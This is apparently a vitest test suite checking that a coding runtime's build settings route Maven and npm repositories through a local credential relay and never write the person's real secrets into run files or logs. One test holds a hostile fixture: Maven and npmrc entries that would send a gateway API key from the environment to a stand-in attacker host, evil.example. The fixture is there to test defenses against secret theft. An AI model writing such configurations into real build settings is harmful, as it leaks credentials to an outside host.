import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import type { ServerLogEvent, ServerLogSink } from "@oscharko-dev/keiko-activity-log";

import {
  expectActivityLogProof,
  formatActivityLogProofLine,
} from "../../../../tests/support/activity-log-proof.js";
import {
  createRepositoryCredentialRelay,
  repositoryRelayBaseUrl,
  type RepositoryCredentialRelay,
} from "../repository-relay/repositoryCredentialRelay.js";
import { prepareNativeBuildSettings } from "./nativeBuildSettings.js";

// #4522: the run's build settings carry capabilities of Keiko's repository credential relay, never
// the person's repository credentials.
const ORIGIN = "http://127.0.0.1:41999";
const MAVEN_PASSWORD = "maven-login-PLANTED-9f3";
const NPM_TOKEN = "npm-token-PLANTED-77a";
const SECRET_FORMS = [MAVEN_PASSWORD, NPM_TOKEN].flatMap((secret) => [
  secret,
  Buffer.from(secret).toString("base64"),
  Buffer.from(`corp-user:${secret}`).toString("base64"),
]);

const MAVEN_SETTINGS = `<?xml version="1.0"?>
<settings>
  <servers>
    <server><id>corp</id><username>corp-user</username><password>${MAVEN_PASSWORD}</password></server>
    <server><id>plugins</id><username>corp-user</username><password>${MAVEN_PASSWORD}</password></server>
  </servers>
  <mirrors>
    <mirror><id>corp</id><mirrorOf>*</mirrorOf><url>https://nexus.corp.example/repository/group/</url></mirror>
  </mirrors>
  <proxies>
    <proxy><id>p</id><active>true</active><host>proxy.corp.example</host><port>3128</port><nonProxyHosts>*.corp.example</nonProxyHosts></proxy>
    <proxy><id>q</id><active>false</active><host>proxy2.corp.example</host><port>3128</port></proxy>
  </proxies>
  <profiles>
    <profile>
      <id>build</id>
      <repositories><repository><id>plugins</id><url>https://nexus.corp.example/repository/libs/</url></repository></repositories>
      <pluginRepositories><pluginRepository><id>plugins</id><url>https://nexus.corp.example/repository/libs/</url></pluginRepository></pluginRepositories>
    </profile>
  </profiles>
  <activeProfiles><activeProfile>build</activeProfile></activeProfiles>
</settings>
`;

const NPMRC = `registry=https://npm.corp.example/registry/
@corp:registry=https://npm.corp.example/scoped/
//npm.corp.example/registry/:_authToken=${NPM_TOKEN}
//npm.corp.example/scoped/:_authToken=${NPM_TOKEN}
audit=true
strict-ssl=true
`;

const roots: string[] = [];
afterEach(() => {
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

function temp(): string {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "keiko-relay-binding-")));
  roots.push(root);
  return root;
}

function person(files: {
  readonly maven?: string;
  readonly npm?: string;
  readonly security?: string;
}): string {
  const home = join(temp(), "person");
  mkdirSync(join(home, ".m2"), { recursive: true });
  if (files.maven !== undefined) writeFileSync(join(home, ".m2", "settings.xml"), files.maven);
  if (files.security !== undefined)
    writeFileSync(join(home, ".m2", "settings-security.xml"), files.security);
  if (files.npm !== undefined) writeFileSync(join(home, ".npmrc"), files.npm);
  return home;
}

interface Run {
  readonly relay: RepositoryCredentialRelay;
  readonly relayLines: ServerLogEvent[];
  readonly lines: ServerLogEvent[];
  readonly stateRoot: string;
  readonly result: ReturnType<typeof prepareNativeBuildSettings>;
  readonly settings: () => string;
  readonly npmConfig: () => string;
}

function prepare(
  realHome: string,
  options: {
    readonly mode?: string;
    readonly env?: Record<string, string | undefined>;
    readonly relay?: boolean;
    readonly noProxy?: string;
  } = {},
): Run {
  const stateRoot = join(temp(), "run");
  mkdirSync(stateRoot, { recursive: true });
  const lines: ServerLogEvent[] = [];
  const relayLines: ServerLogEvent[] = [];
  const sink: ServerLogSink = {
    write: (event) => {
      lines.push(event);
    },
  };
  const relay = createRepositoryCredentialRelay({
    activityLog: () => ({
      write: (event): void => {
        relayLines.push(event);
      },
    }),
  });
  const result = prepareNativeBuildSettings({
    runId: "run-relay-1",
    mode: options.mode ?? "supervised-coding",
    realHome,
    stateRoot,
    ...(options.relay === false
      ? {}
      : { repositoryRelay: { relay, origin: ORIGIN, env: options.env ?? {} } }),
    inheritedNoProxy: options.noProxy,
    activityLog: sink,
  });
  return {
    relay,
    relayLines,
    lines,
    stateRoot,
    result,
    settings: () => readFileSync(join(stateRoot, "home", ".m2", "settings.xml"), "utf8"),
    npmConfig: () => readFileSync(result.env.NPM_CONFIG_USERCONFIG ?? "", "utf8"),
  };
}

function everyFileText(root: string): string {
  const texts: string[] = [];
  const visit = (directory: string): void => {
    for (const entry of readdirSync(directory)) {
      const path = join(directory, entry);
      if (statSync(path).isDirectory()) visit(path);
      else texts.push(readFileSync(path, "utf8"));
    }
  };
  visit(root);
  return texts.join("\n");
}

function relayIdsOf(text: string): string[] {
  return [...text.matchAll(/\/api\/coding-sidecar\/repository\/([A-Za-z0-9_-]+)\//gu)].map(
    (match) => match[1] ?? "",
  );
}

describe("the run's Maven settings with the repository relay (#4522)", () => {
  it("puts every mirror, repository and plugin repository on the relay with a capability", () => {
    const run = prepare(person({ maven: MAVEN_SETTINGS }));
    const settings = run.settings();
    expect(settings).not.toContain("nexus.corp.example/repository");
    const ids = [...new Set(relayIdsOf(settings))];
    // One binding per repository id: the mirror, and the repository and plugin repository that share one.
    expect(ids).toHaveLength(2);
    expect(
      settings.match(/<url>http:\/\/127\.0\.0\.1:41999\/api\/coding-sidecar\/repository\//gu),
    ).toHaveLength(3);
    expect(settings).toContain("<mirrorOf>*</mirrorOf>");
    expect(run.result.relay).toMatchObject({ mavenBoundCount: 2, npmBoundCount: 0, refusals: [] });
  });

  it("adds a server per id whose password is the capability, never the person's password", () => {
    const run = prepare(person({ maven: MAVEN_SETTINGS }));
    const settings = run.settings();
    const servers = [
      ...settings.matchAll(
        /<server><id>([^<]+)<\/id><username>([^<]+)<\/username><password>([^<]+)<\/password><\/server>/gu,
      ),
    ];
    expect(servers.map((match) => match[1]).sort()).toEqual(["corp", "plugins"]);
    for (const [, , username, password] of servers) {
      expect(username).toBe("keiko-relay");
      expect(password).not.toBe(MAVEN_PASSWORD);
      const ids = relayIdsOf(settings);
      expect(ids.some((id) => run.relay.authenticate(id, password) !== undefined)).toBe(true);
    }
  });

  it("goes online below Full access and keeps the read-only cache chained", () => {
    const home = person({ maven: MAVEN_SETTINGS });
    const run = prepare(home, { mode: "governed-assist" });
    expect(run.settings()).toContain("<offline>false</offline>");
    const cached = prepare(home, { mode: "supervised-coding" });
    expect(cached.settings()).toContain("<offline>false</offline>");
    expect(run.result.javaProperties["aether.transport.http.preemptiveAuth"]).toBe("true");
    expect(run.result.javaProperties["aether.connector.http.preemptiveAuth"]).toBe("true");
  });

  it("keeps the read-only cache tail where it applies today", () => {
    const realHome = person({ maven: MAVEN_SETTINGS });
    const stateRoot = join(temp(), "run");
    mkdirSync(stateRoot, { recursive: true });
    const cache = join(realHome, ".m2", "repository");
    const result = prepareNativeBuildSettings({
      runId: "run-relay-2",
      mode: "supervised-coding",
      realHome,
      stateRoot,
      readOnlyMavenRepository: cache,
      repositoryRelay: {
        relay: createRepositoryCredentialRelay({ activityLog: () => undefined }),
        origin: ORIGIN,
        env: {},
      },
      activityLog: { write: () => undefined },
    });
    expect(result.javaProperties["maven.repo.local.tail"]).toBe(cache);
  });

  it("exempts loopback from every proxy, extending an existing list", () => {
    const settings = prepare(person({ maven: MAVEN_SETTINGS })).settings();
    expect(settings).toContain("<nonProxyHosts>*.corp.example|127.0.0.1|localhost</nonProxyHosts>");
    expect(settings).toContain("<nonProxyHosts>127.0.0.1|localhost</nonProxyHosts>");
  });

  it("sends loopback around the proxy for the run's tools, keeping the inherited list", () => {
    const run = prepare(person({ maven: MAVEN_SETTINGS }), { noProxy: "internal.example" });
    expect(run.result.env.NO_PROXY).toBe("internal.example,127.0.0.1,localhost");
    expect(run.result.env.no_proxy).toBe("internal.example,127.0.0.1,localhost");
  });

  it("writes no resolved secret into any file of the run", () => {
    const run = prepare(person({ maven: MAVEN_SETTINGS, npm: NPMRC }));
    const text = everyFileText(run.stateRoot);
    for (const form of SECRET_FORMS) expect(text).not.toContain(form);
    expect(JSON.stringify(run.result)).not.toContain(MAVEN_PASSWORD);
    expect(JSON.stringify(run.lines)).not.toContain(MAVEN_PASSWORD);
    expect(JSON.stringify(run.relayLines)).not.toContain(MAVEN_PASSWORD);
  });

  it("resolves an environment placeholder in the login, never in a repository URL", () => {
    const login = `<settings><servers><server><id>env</id><username>u</username><password>\${env.REPO_PW}</password></server></servers>
<mirrors><mirror><id>env</id><mirrorOf>*</mirrorOf><url>https://nexus.corp.example/group/</url></mirror></mirrors></settings>`;
    const run = prepare(person({ maven: login }), { env: { REPO_PW: "env-password-PLANTED" } });
    expect(run.settings()).toContain("/api/coding-sidecar/repository/");
    expect(run.settings()).not.toContain("env-password-PLANTED");
    expect(run.result.relay?.mavenBoundCount).toBe(1);
    const interpolated = `<settings><mirrors><mirror><id>env</id><mirrorOf>*</mirrorOf><url>\${env.REPO_URL}</url></mirror></mirrors></settings>`;
    const refused = prepare(person({ maven: interpolated }), {
      env: { REPO_URL: "https://nexus.corp.example/group/" },
    });
    expect(refused.result.relay).toEqual({
      mavenBoundCount: 0,
      npmBoundCount: 0,
      refusals: ["url-interpolated"],
    });
  });

  it("never lets a gateway key reach a repository through the environment (B2)", () => {
    const xml = `<settings><servers><server><id>m</id><username>u</username><password>\${env.KEIKO_GATEWAY_API_KEY}</password></server></servers>
<mirrors><mirror><id>m</id><mirrorOf>*</mirrorOf><url>https://evil.example/</url></mirror></mirrors></settings>`;
    const run = prepare(
      person({
        maven: xml,
        npm: "registry=https://evil.example/\n//evil.example/:_authToken=${KEIKO_GATEWAY_API_KEY}\n",
      }),
      {
        env: { KEIKO_GATEWAY_API_KEY: "gateway-key-PLANTED-0123" },
      },
    );
    expect(run.result.relay?.mavenBoundCount).toBe(0);
    expect(run.result.relay?.npmBoundCount).toBe(0);
    expect(run.result.relay?.refusals).toEqual(["env-unavailable", "env-unavailable"]);
    expect(everyFileText(run.stateRoot)).not.toContain("gateway-key-PLANTED");
  });
});

describe("the run's npm config with the repository relay (#4522)", () => {
  it("points registry and scoped registries at the relay with the capability as token", () => {
    const run = prepare(person({ npm: NPMRC }));
    const config = run.npmConfig();
    const lines = config.split("\n").filter((line) => line !== "");
    const ids = relayIdsOf(config);
    expect(new Set(ids).size).toBe(2);
    const registry = lines.find((line) => line.startsWith("registry="));
    const scoped = lines.find((line) => line.startsWith("@corp:registry="));
    expect(registry).toMatch(
      /^registry=http:\/\/127\.0\.0\.1:41999\/api\/coding-sidecar\/repository\/[\w-]+\/$/u,
    );
    expect(scoped).toMatch(
      /^@corp:registry=http:\/\/127\.0\.0\.1:41999\/api\/coding-sidecar\/repository\//u,
    );
    const tokens = lines.filter((line) => line.includes(":_authToken="));
    expect(tokens).toHaveLength(2);
    for (const line of tokens) {
      expect(line).toMatch(
        /^\/\/127\.0\.0\.1:41999\/api\/coding-sidecar\/repository\/[\w-]+\/:_authToken=/u,
      );
      const [key, token] = line.split(":_authToken=");
      const id = relayIdsOf(key ?? "")[0] ?? "";
      expect(run.relay.authenticate(id, token)).toBeDefined();
      expect(token).not.toBe(NPM_TOKEN);
    }
    expect(config).not.toContain("npm.corp.example");
    expect(lines).toContain("audit=false");
    expect(lines).not.toContain("audit=true");
    expect(lines).toContain("strict-ssl=true");
    expect(run.result.relay).toMatchObject({ mavenBoundCount: 0, npmBoundCount: 2 });
  });

  it("gives an anonymous registry a capability too", () => {
    const run = prepare(person({ npm: "registry=https://npm.corp.example/anon/\n" }));
    expect(run.npmConfig()).toContain(":_authToken=");
    expect(run.result.relay?.npmBoundCount).toBe(1);
  });

  it("resolves an environment placeholder in the token, not in the registry URL", () => {
    const run = prepare(
      person({
        npm: "registry=https://npm.corp.example/env/\n//npm.corp.example/env/:_authToken=${NPM_TOKEN_VAR}\n",
      }),
      { env: { NPM_TOKEN_VAR: "env-token-PLANTED-1234" } },
    );
    expect(run.npmConfig()).toMatch(/^registry=http:\/\/127\.0\.0\.1:41999\//mu);
    expect(run.npmConfig()).not.toContain("env-token-PLANTED");
    const refused = prepare(person({ npm: "registry=${NPM_URL}\n" }), {
      env: { NPM_URL: "https://npm.corp.example/env/" },
    });
    expect(refused.result.relay?.refusals).toEqual(["url-interpolated"]);
  });
});

describe("what stays as it was (#4522)", () => {
  it("changes nothing when no repository resolves", () => {
    const home = person({
      maven: "<settings><profiles><profile><id>x</id></profile></profiles></settings>",
      npm: "strict-ssl=true\n",
    });
    const withRelay = prepare(home, { mode: "governed-assist" });
    const without = prepare(home, { mode: "governed-assist", relay: false });
    const inOwnRoot = (run: Run): string => run.settings().replaceAll(run.stateRoot, "<run>");
    expect(inOwnRoot(withRelay)).toBe(inOwnRoot(without));
    expect(withRelay.settings()).toContain("<offline>true</offline>");
    expect(withRelay.npmConfig()).toBe(without.npmConfig());
    const normalized = (run: Run, value: unknown): string =>
      JSON.stringify(value).replaceAll(run.stateRoot, "<run>");
    expect(normalized(withRelay, withRelay.result.env)).toBe(
      normalized(without, without.result.env),
    );
    expect(normalized(withRelay, withRelay.result.javaProperties)).toBe(
      normalized(without, without.result.javaProperties),
    );
    expect(withRelay.result.relay).toEqual({ mavenBoundCount: 0, npmBoundCount: 0, refusals: [] });
  });

  it("changes nothing when the run is not offered a relay", () => {
    const run = prepare(person({ maven: MAVEN_SETTINGS, npm: NPMRC }), { relay: false });
    expect(run.settings()).not.toContain("<servers>");
    expect(run.result.relay).toBeUndefined();
    expect(run.lines[0]).not.toHaveProperty("relayMavenBoundCount");
  });

  it("binds nothing from a settings file the sanitizer refuses", () => {
    const run = prepare(person({ maven: "<!DOCTYPE settings><settings></settings>" }));
    expect(run.result.mavenSettings).toBe("refused");
    expect(run.result.relay?.mavenBoundCount).toBe(0);
  });
});

describe("release and refusal (#4522)", () => {
  it("revokes every binding of the run when it is released, and no other run's", () => {
    const run = prepare(person({ maven: MAVEN_SETTINGS, npm: NPMRC }));
    const settings = run.settings();
    const mavenPassword = /<password>([^<]+)<\/password>/u.exec(settings)?.[1];
    const id = relayIdsOf(settings)[0] ?? "";
    expect(run.relay.authenticate(id, mavenPassword)).toBeDefined();
    run.relay.releaseRun("another-run");
    expect(run.relay.authenticate(id, mavenPassword)).toBeDefined();
    run.relay.releaseRun("run-relay-1");
    expect(run.relay.authenticate(id, mavenPassword)).toBeUndefined();
    expect(run.relay.wasRevoked(id, mavenPassword)).toBe(true);
    expect(run.relayLines.filter((line) => line.extra?.action === "release")).toHaveLength(4);
  });

  it("counts the repositories left out by closed reason and never names them", () => {
    const xml = `<settings>
<servers>
<server><id>short</id><username>u</username><password>tiny</password></server>
<server><id>half</id><username>u</username></server>
<server><id>twice</id><username>u</username><password>long-enough-password</password></server>
</servers>
<mirrors>
<mirror><id>short</id><mirrorOf>a</mirrorOf><url>https://short.corp.example/</url></mirror>
<mirror><id>half</id><mirrorOf>b</mirrorOf><url>https://half.corp.example/</url></mirror>
<mirror><id>gone</id><mirrorOf>c</mirrorOf><url>\${env.NOT_SET}</url></mirror>
<mirror><id>own</id><mirrorOf>d</mirrorOf><url>${ORIGIN}/x/</url></mirror>
<mirror><id>twice</id><mirrorOf>e</mirrorOf><url>https://one.corp.example/</url></mirror>
<mirror><id>twice</id><mirrorOf>f</mirrorOf><url>https://two.corp.example/</url></mirror>
<mirror><mirrorOf>g</mirrorOf><url>https://noid.corp.example/</url></mirror>
</mirrors></settings>`;
    const run = prepare(person({ maven: xml }));
    expect(run.result.relay?.mavenBoundCount).toBe(1);
    expect([...(run.result.relay?.refusals ?? [])].sort()).toEqual([
      "credential-incomplete",
      "credential-too-short",
      "id-ambiguous",
      "id-missing",
      "url-interpolated",
      "url-own-origin",
    ]);
    const line = run.lines[0];
    expect(line).toMatchObject({
      op: "coding-runtime.native-build-settings.admitted",
      correlationId: "run-relay-1",
    });
    expect(line?.extra).toMatchObject({
      relayMavenBoundCount: 1,
      relayNpmBoundCount: 0,
      relayRefusedCount: 6,
      relayRefusalReasons: [
        "credential-incomplete",
        "credential-too-short",
        "id-ambiguous",
        "id-missing",
        "url-interpolated",
        "url-own-origin",
      ],
    });
    const serialized = JSON.stringify(line);
    for (const hidden of ["corp.example", "long-enough-password", "NOT_SET"]) {
      expect(serialized).not.toContain(hidden);
    }
    expectActivityLogProof(
      "coding-runtime.native-build-settings.admitted.emitted-line",
      formatActivityLogProofLine(line ?? {}),
    );
  });

  it("refuses a bound repository the relay cannot bind and counts it", () => {
    const stateRoot = join(temp(), "run");
    mkdirSync(stateRoot, { recursive: true });
    const lines: ServerLogEvent[] = [];
    const result = prepareNativeBuildSettings({
      runId: "run-relay-3",
      mode: "supervised-coding",
      realHome: person({ npm: "registry=https://npm.corp.example/r/\n" }),
      stateRoot,
      repositoryRelay: {
        relay: {
          bind: () => undefined,
          authenticate: () => undefined,
          wasRevoked: () => false,
          releaseRun: () => undefined,
        },
        origin: ORIGIN,
        env: {},
      },
      activityLog: { write: (event) => void lines.push(event) },
    });
    expect(result.relay).toEqual({
      mavenBoundCount: 0,
      npmBoundCount: 0,
      refusals: ["bind-refused"],
    });
    expect(existsSync(result.env.NPM_CONFIG_USERCONFIG ?? "")).toBe(true);
    expect(readFileSync(result.env.NPM_CONFIG_USERCONFIG ?? "", "utf8")).toContain(
      "npm.corp.example",
    );
    expect(lines[0]?.extra).toMatchObject({
      relayRefusedCount: 1,
      relayRefusalReasons: ["bind-refused"],
    });
  });

  it("builds the relay base URL the settings use", () => {
    expect(repositoryRelayBaseUrl(ORIGIN, "abc")).toBe(
      `${ORIGIN}/api/coding-sidecar/repository/abc/`,
    );
  });
});
